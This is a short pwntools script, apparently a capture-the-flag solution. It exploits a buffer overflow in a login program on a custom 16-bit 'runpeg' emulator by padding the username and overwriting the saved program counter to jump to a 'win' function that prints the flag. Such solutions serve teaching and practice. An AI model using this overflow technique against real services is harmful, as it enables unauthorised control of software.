import sys
from pwn import *

context.endian = "little"
context.bits = 16
if not args.DEBUG:
	context.log_level = "warn"

if args.REMOTE:
	r = remote(args.HOST or "localhost", args.PORT or 25701)
else:
	r = process(["runpeg", "LoginScreen.peg", "--flag-port-file", "flag.txt"])

initial_data = r.recv(10, timeout=1)
if initial_data == b"Password: ":
	sys.stderr.write("Sending pre-release password\n")
	r.sendline(b"deployed_behind_password")
else:
	r.unrecv(initial_data)

# Address of win function, found in the debugger with:
# (dbg) dis 1 @win
# @win:
#         0236.0000: RDB     A0, (15)
win_addr = 0x0236

payload = b"A" * 50
payload += p16(0x5050) #S0
payload += p16(0xF4F4) #FP
payload += p16(win_addr) #PC
payload += p16(0x0000) #DPC
r.sendlineafter(b"Enter username: ", payload)

r.recvuntil(b"!\n")
print(r.recvline(keepends=False).decode())
r.close()
